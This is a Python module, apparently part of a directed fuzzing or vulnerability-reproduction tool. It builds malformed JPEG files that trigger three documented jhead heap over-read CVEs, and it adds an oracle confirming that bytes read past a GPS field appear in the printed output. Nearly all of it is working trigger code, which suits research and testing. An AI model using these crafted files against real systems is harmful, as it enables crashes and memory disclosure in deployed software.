"""Directed triggers for heap over-reads behind the JPEG/EXIF container format (CWE-125).

jhead's JPEG-reachable defects are unbounded pointer reads in the marker/EXIF walk, not buffer
writes -- the string copies are all length-clamped, but the section/offset arithmetic is not. Each
is reached by `jhead <file>` on a VALID JPEG whose one malformed marker or EXIF field drives the
read past the section the parser allocated. A blind fuzzer rarely lands these: it has to keep a
parseable JPEG (SOI, a well-formed APP1/Exif TIFF directory) while making one length or format
field inconsistent, and random mutation breaks the marker framing first. Once a detector has
narrowed to the sink, the trigger is a single construction -- no campaign.

Three documented shapes, all heap over-READs reproduced on the ASan build as `heap-buffer-overflow
READ` (L1), all delivered inside a valid JPEG container:

  * tiny_app1  (CVE-2020-26208): an APP1 marker whose section length is 2 (no payload). jhead
    mallocs the 2-byte section and `memcmp(Data+2, "Exif", 4)` reads four bytes past it.
  * short_exif (CVE-2018-6612):  an APP1 "Exif\\0\\0" section shorter than 16 bytes. jhead reads
    `Get32u(ExifSection+12)` for the first-IFD offset before the length is checked.
  * gps_wrongfmt (CVE-2020-6625): a GPS sub-IFD whose GPS_LATITUDE tag has the wrong format
    (ULONG, inline) so ProcessGpsInfo's three-component loop reads `Get32s(ValuePtr+4+a*size)`
    past the inline value and the section.

Two of the over-reads (tiny_app1, short_exif) feed internal comparisons / offset words, so they are
honest L1s (reproduced out-of-bounds reads). The GPS over-read (CVE-2020-6625) reaches L3: the bytes
it reads past the declared coordinate flow into the PRINTED latitude. `gps_disclose` builds a
complete JPEG that reaches ShowImageInfo and declares a one-component latitude followed by two more
rationals the fixed three-component loop reads and prints as minutes/seconds; `confirm_gps_disclosure`
varies only those past-the-field bytes (declared degrees fixed) and confirms the printed coordinate
carries them -- a forgery-proof numeric disclosure.

The container builder (`_jpeg`) and the EXIF/TIFF directory helper are shared, so adding another
JPEG/EXIF sink is a short addition, as with the GIF palette and ZIP method constructors.
"""
from __future__ import annotations

import struct

_SOI = b"\xff\xd8"
_EOI = b"\xff\xd9"
_APP1 = b"\xff\xe1"

# EXIF value formats (jhead.h)
FMT_ULONG = 4
FMT_URATIONAL = 5
# GPS sub-IFD tags (gpsinfo.c)
_TAG_GPSINFO = 0x8825      # IFD0 tag pointing at the GPS sub-IFD
_TAG_GPS_LAT = 2


def _jpeg(segments: bytes) -> bytes:
    """Wrap marker `segments` as a JPEG between SOI and EOI."""
    return _SOI + segments + _EOI


def _app1(payload: bytes) -> bytes:
    """An APP1 marker carrying `payload` (the 2-byte length counts itself)."""
    return _APP1 + struct.pack(">H", len(payload) + 2) + payload


def tiny_app1() -> bytes:
    """CVE-2020-26208: an APP1 section of length 2 -- a 2-byte allocation that `memcmp(Data+2,
    "Exif", 4)` reads past."""
    return _jpeg(_APP1 + struct.pack(">H", 2))


def short_exif() -> bytes:
    """CVE-2018-6612: an APP1 "Exif\\0\\0" section shorter than 16 bytes, so the unguarded
    `Get32u(ExifSection+12)` first-offset read runs past it."""
    exif = b"Exif\x00\x00" + b"MM\x00\x2a\x00\x00\x00"      # 6 + 7 = 13 bytes < 16
    return _jpeg(_app1(exif))


def gps_wrongfmt(*, inline: bytes = b"\x01\x00\x00\x00", trailing: bytes = b"") -> bytes:
    """CVE-2020-6625: a GPS sub-IFD whose GPS_LATITUDE tag has format ULONG (not URATIONAL) and a
    single inline component, so ProcessGpsInfo's fixed three-component loop reads past the inline
    value and the section (`Get32s(ValuePtr+4+a*4)` for a=0,1,2).

    `trailing` plants bytes after the GPS IFD inside the section; `inline` is the 4-byte value the
    read starts from -- the hooks a future disclosure oracle would vary to confirm the leak.
    """
    # TIFF (little-endian): header -> IFD0 (one GPSInfo pointer) -> GPS sub-IFD (one GPS_LAT entry)
    hdr = b"II" + struct.pack("<H", 0x2A) + struct.pack("<I", 8)
    gps_off = 8 + (2 + 12 + 4)                              # IFD0 occupies [8, 26)
    ifd0 = (struct.pack("<H", 1)
            + struct.pack("<HHI", _TAG_GPSINFO, FMT_ULONG, 1) + struct.pack("<I", gps_off)
            + struct.pack("<I", 0))
    gps = (struct.pack("<H", 1)
           + struct.pack("<HHI", _TAG_GPS_LAT, FMT_ULONG, 1) + inline
           + struct.pack("<I", 0))
    return _jpeg(_app1(b"Exif\x00\x00" + hdr + ifd0 + gps + trailing))


# The triggers a directed stage detonates, in order: simplest and most version-robust first.
TRIGGERS = (
    ("tiny_app1", tiny_app1),
    ("short_exif", short_exif),
    ("gps_wrongfmt", gps_wrongfmt),
)

# GPS sub-IFD tags used by the disclosure oracle below.
_TAG_GPS_LAT_REF = 1
FMT_LONG = 4


def _complete(app1_segment: bytes) -> bytes:
    """Wrap an APP1 segment in a JPEG COMPLETE enough that jhead reaches ShowImageInfo and PRINTS
    the parsed summary (the over-read's output sink). A minimal baseline frame (SOF0, 16x16, 3
    components) gives dimensions, and a Start-Of-Scan marker makes jhead stop reading sections
    cleanly ("stop before hitting compressed data") instead of erroring on a truncated stream."""
    sof0 = (b"\xff\xc0" + struct.pack(">H", 17) + b"\x08" + struct.pack(">HH", 16, 16)
            + b"\x03" + b"\x01\x11\x00\x02\x11\x00\x03\x11\x00")
    sos = b"\xff\xda" + struct.pack(">H", 12) + b"\x03\x01\x00\x02\x11\x03\x11\x00\x3f\x00"
    return _SOI + app1_segment + sof0 + sos + _EOI


def gps_disclose(*, degrees: int = 12, sentinel_min: int, sentinel_sec: int) -> bytes:
    """A COMPLETE JPEG whose GPS latitude DECLARES a single URATIONAL component (`degrees`/1 -- a
    legitimate, in-bounds value) but whose GPS sub-IFD is followed in the EXIF by two more rationals
    (`sentinel_min`/1, `sentinel_sec`/1). jhead's ProcessGpsInfo loops a FIXED three times over the
    coordinate regardless of the declared component count (CVE-2020-6625), so it reads those two
    past-the-field rationals and prints them as the latitude's minutes and seconds -- an
    out-of-bounds-of-the-field read whose bytes reach stdout. Varying only the sentinels (the
    declared degrees fixed) makes this a forgery-proof disclosure oracle: the printed coordinate is
    a function of memory past the one component the file declared.
    """
    hdr = b"II" + struct.pack("<H", 0x2A) + struct.pack("<I", 8)
    gps_off = 8 + (2 + 12 + 4)                              # IFD0 occupies [8, 26)
    ifd0 = (struct.pack("<H", 1)
            + struct.pack("<HHI", _TAG_GPSINFO, FMT_LONG, 1) + struct.pack("<I", gps_off)
            + struct.pack("<I", 0))
    # GPS sub-IFD: LAT_REF ('N'), then LAT = ONE URATIONAL whose value sits at an offset. The buggy
    # three-component loop reads [value, value+8, value+16); only the first 8 bytes are declared.
    n_entries = 2
    entries_len = n_entries * 12 + 4
    val_off = gps_off + 2 + entries_len
    e_ref = struct.pack("<HHI", _TAG_GPS_LAT_REF, 2, 2) + b"N\x00\x00\x00"
    e_lat = struct.pack("<HHI", _TAG_GPS_LAT, FMT_URATIONAL, 1) + struct.pack("<I", val_off)
    gps = struct.pack("<H", n_entries) + e_ref + e_lat + struct.pack("<I", 0)
    declared = struct.pack("<ii", degrees, 1)              # the one component the file declares
    leaked = struct.pack("<ii", sentinel_min, 1) + struct.pack("<ii", sentinel_sec, 1)
    exif = b"Exif\x00\x00" + hdr + ifd0 + gps + declared + leaked
    return _complete(_app1(exif))


def confirm_gps_disclosure(read_coord, *, degrees: int = 12) -> dict:
    """Forgery-proof disclosure oracle for the GPS over-read. `read_coord(sentinel_min,
    sentinel_sec)` builds `gps_disclose(...)`, runs the (uninstrumented) target on it, and returns
    the printed latitude parsed as (deg, minutes, seconds) or None.

    Disclosure is confirmed when two probes that differ ONLY in the past-the-field sentinels print
    those exact sentinels as the coordinate's minutes/seconds, while the declared degrees stays
    fixed -- so the output demonstrably carries bytes the file never declared. Returns
    {disclosed, degrees, probes:[...]}.
    """
    probes = [(31337, 22251), (51868, 10427)]
    seen = []
    ok = True
    for smin, ssec in probes:
        got = read_coord(smin, ssec)
        seen.append({"inject": [smin, ssec], "printed": got})
        if not got or got[0] != degrees or got[1] != smin or got[2] != ssec:
            ok = False
    # forgery-proof: the two probes must have produced DIFFERENT printed coordinates (a target that
    # echoed a constant or ignored the input would not).
    if ok and seen[0]["printed"] == seen[1]["printed"]:
        ok = False
    return {"disclosed": ok, "degrees": degrees, "probes": seen}
